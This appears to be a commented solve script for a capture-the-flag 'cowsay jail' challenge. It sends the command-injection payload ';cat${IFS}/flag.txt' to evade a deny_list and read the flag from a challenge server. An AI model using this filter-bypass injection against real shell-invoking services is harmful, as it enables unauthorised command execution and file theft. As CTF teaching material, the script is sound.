#!/usr/bin/env python3
# =============================================================================
# cowsay jail - Daily AlpacaHack
# カテゴリー: Misc | トピック: Jail | 難易度: Medium 4.0
# =============================================================================
# 【概要】
# 配布ファイル jail.py は、入力を cowsay の引数として subprocess.run(..., shell=True)
# で実行します。ただし deny_list にスペースやパイプなどが含まれており、素朴な
# コマンドインジェクションは弾かれます。
#
# ポイントは次の 2 つです。
#
#   1. shell=True なので、シェルのメタ文字（; など）で別コマンドを続けて実行できる
#   2. スペースは禁止だが、シェル変数 ${IFS} は許可されている
#      （IFS は Internal Field Separator。展開すると空白になる）
#
# そこで次のペイロードを送ります。
#
#   ;cat${IFS}/flag.txt
#
# jail.py 側では次のように展開されます。
#
#   cowsay ;cat${IFS}/flag.txt
#     → まず cowsay（引数なし）が動き、
#     → 続けて cat /flag.txt が実行されてフラグが表示される
#
# 【準備】
#   追加ライブラリは不要です（socket は Python 標準ライブラリ）。
#   問題ページで起動したチャレンジインスタンスのホストとポートを用意してください。
#
# 【使い方】
#   python3 solve.py                      # 既定の接続先へ攻撃
#   python3 solve.py <host> <port>        # 接続先を指定
#
# ※ フラグはこのファイルには書かれていません。実行時にサーバーから受信して表示します。
# =============================================================================

import socket  # TCP 接続用（Python 標準ライブラリ）
import sys     # コマンドライン引数の取得用
import time    # 受信待ちの短いスリープ用

# =============================================================================
# 定数: 接続先とペイロード
# =============================================================================
# 既定の接続先。チャレンジはインスタンス制のことが多いので、
# 問題ページで表示されたホスト・ポートがあれば引数で上書きしてください。
HOST = "34.170.146.252"
PORT = 56044

if len(sys.argv) >= 3:
    HOST, PORT = sys.argv[1], int(sys.argv[2])

# deny_list をすり抜けるペイロード。
#   ;           … cowsay のあと別コマンドを始める（コマンド区切り）
#   cat         … ファイルの中身を表示するコマンド
#   ${IFS}      … スペースの代わり（IFS の展開結果がフィールド区切り＝空白）
#   /flag.txt   … フラグのパス（ハイフンもスペースもないので deny_list に引っかからない）
PAYLOAD = ";cat${IFS}/flag.txt\n"


def main():
    # -------------------------------------------------------------------------
    # Step 0: サーバーへ接続
    # -------------------------------------------------------------------------
    print(f"[*] Connecting to {HOST}:{PORT} ...")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5.0)
            s.connect((HOST, PORT))

            # -----------------------------------------------------------------
            # Step 1: 初期プロンプト（"$ cowsay "）を受け取る
            # -----------------------------------------------------------------
            # jail.py は input("$ cowsay ") でプロンプトを出してから 1 行読みます。
            # 少し待ってから受信し、接続できていることを確認します。
            time.sleep(0.5)
            try:
                initial = s.recv(4096).decode(errors="ignore")
                print("--- Initial Output ---")
                print(initial if initial else "(empty)")
            except socket.timeout:
                pass

            # -----------------------------------------------------------------
            # Step 2: ペイロードを送信する
            # -----------------------------------------------------------------
            # サーバー側で実行されるシェルコマンドは次の形になります。
            #
            #   cowsay ;cat${IFS}/flag.txt
            #
            # deny_list = ["\t", " ", "-", "'", '"', "`", "(", ")", "<", ">", "&", "|"]
            # このペイロードに含まれる文字はどれも deny_list に入っていないので通過します。
            print(f"[*] Sending payload: {PAYLOAD.strip()}")
            s.sendall(PAYLOAD.encode())

            # -----------------------------------------------------------------
            # Step 3: 応答を受信して表示する
            # -----------------------------------------------------------------
            # cowsay のアスキーアートのあとに、cat /flag.txt の出力（フラグ）が続きます。
            time.sleep(1.0)
            chunks = []
            try:
                while True:
                    data = s.recv(4096)
                    if not data:
                        break
                    chunks.append(data)
            except socket.timeout:
                pass

            text = b"".join(chunks).decode(errors="ignore")
            print("--- Result ---")
            print(text if text else "(no data received)")
            if "Alpaca{" in text:
                print("[+] flag received")

    except Exception as e:
        print(f"Error: {e}")
        print(
            "[!] 接続に失敗しました。"
            "問題ページでインスタンスを起動し、"
            "python3 solve.py <host> <port> で接続先を指定してください。"
        )
        raise SystemExit(1)


if __name__ == "__main__":
    main()
